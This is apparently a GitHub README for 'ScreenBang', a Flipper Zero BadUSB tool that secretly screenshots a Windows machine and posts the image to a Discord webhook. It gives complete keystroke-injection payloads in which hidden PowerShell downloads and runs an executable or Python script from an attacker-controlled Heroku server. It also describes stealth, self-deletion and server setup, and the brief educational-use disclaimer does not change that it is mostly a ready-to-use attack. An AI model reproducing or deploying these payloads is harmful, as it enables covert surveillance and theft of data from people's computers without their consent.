
# **ScreenBang**

**ScreenBang** is a Flipper Zero payload designed to discreetly capture a screenshot of a target Windows machine and send it directly to a Discord server via a webhook. This tool provides both a Python-based solution and a standalone executable for flexible and seamless use.

---

## **Features**
- 📸 **Screenshot Capture**: Takes a full-screen screenshot of the target machine.
- 🚀 **Discord Webhook Integration**: Automatically sends screenshots to a Discord channel.
- 🧹 **Automatic Cleanup**: Deletes temporary files, including the executable, after execution.
- 🕵️ **Stealth Mode**: Operates using hidden PowerShell commands to avoid detection.
- 🔌 **Flipper Zero Integration**: Designed specifically for Flipper Zero's BadUSB functionality.

---

## **Project Structure**
```
ScreenBang/
│
├── bang.py               # Python script for screenshot capture and Discord webhook
├── bang.exe              # Compiled standalone executable of bang.py
├── app.py                # Flask server for hosting the scripts
├── Screen Bang PY        # Payload for downloading and executing bang.py
├── Screen Bang EXE       # Payload for downloading and executing bang.exe
├── LICENSE               # MIT license
├── README.md             # Project documentation
```

---

## **Requirements**
- A **Flipper Zero** device with BadUSB functionality enabled.
- A **Discord Webhook URL**.
- A target machine running Windows (7, 10, or 11).

### **Optional: Python-based setup**
- Python 3.8+ installed on the target machine.
- Required Python libraries:
  - `requests`
  - `Pillow`

---

## **Installation**

### **1. Modify the Webhook URL**
To use the Python script, you must replace the placeholder webhook URL with your own.

1. Open `bang.py` in any text editor.
2. Locate the line:
   ```python
   WEBHOOK_URL = "<Your discord webhook here>"
   ```
3. Replace `<Your discord webhook here>` with your actual Discord webhook URL. For example:
   ```python
   WEBHOOK_URL = "https://discord.com/api/webhooks/your_webhook_id/your_webhook_token"
   ```
4. Save the file.

---

### **2. Deploy the Flask Server**
1. Clone the repository:
   ```bash
   git clone https://github.com/DuarteAd/ScreenBang.git
   cd ScreenBang
   ```
2. Install dependencies for the Flask server:
   ```bash
   pip install -r requirements.txt
   ```
3. Deploy the server to a cloud platform (e.g., Heroku):
   ```bash
   heroku create
   git push heroku main
   ```
4. The server will host `bang.py` and `bang.exe` for payloads to download.

---

### **3. Prepare Flipper Zero Payloads**
1. **For the executable**:
   - Use the `Screen Bang EXE` payload:
     ```plaintext
     REM Download and execute bang.exe
     DELAY 1000
     GUI r
     DELAY 500
     STRING powershell -WindowStyle Hidden -Command "& {Start-BitsTransfer -Source 'https://<your-heroku-app>.herokuapp.com/bang.exe' -Destination 'C:\Temp\bang.exe'; Start-Process -WindowStyle Hidden -FilePath 'C:\Temp\bang.exe'}"
     ENTER
     ```
2. **For the Python script**:
   - Use the `Screen Bang PY` payload:
     ```plaintext
     REM Download and execute bang.py
     DELAY 1000
     GUI r
     DELAY 500
     STRING powershell -Command "Invoke-WebRequest -Uri 'https://<your-heroku-app>.herokuapp.com/bang.py' -OutFile 'C:\Temp\bang.py'; python C:\Temp\bang.py"
     ENTER
     ```

---

## **Usage**
1. Load the payload onto your Flipper Zero.
2. Connect the Flipper Zero to the target Windows machine.
3. Execute the payload to capture a screenshot and send it to Discord.

---

## **Disclaimer**
- This project is for **educational purposes only**.
- Unauthorized use of this tool is **strictly prohibited** and may violate local laws.
- Ensure you have explicit permission before using this tool on any machine.

---

## **Credits**
This project was developed by **DuarteAd** with the goal of providing a practical and educational example of Flipper Zero's BadUSB capabilities.

### **Special Thanks**
- The **Flipper Zero Community** for their continuous support and innovation.
- The developers of **Pillow** and **Requests** for enabling key functionalities in this project.
- Everyone who contributed feedback and testing to improve ScreenBang.

---

## **License**
This project is licensed under the **MIT License**. You are free to use, modify, and distribute this software, provided you include proper credit to the original author.

---

## **Support**
If you encounter any issues or have suggestions for improvement, feel free to open an issue on [GitHub](https://github.com/DuarteAd/ScreenBang).
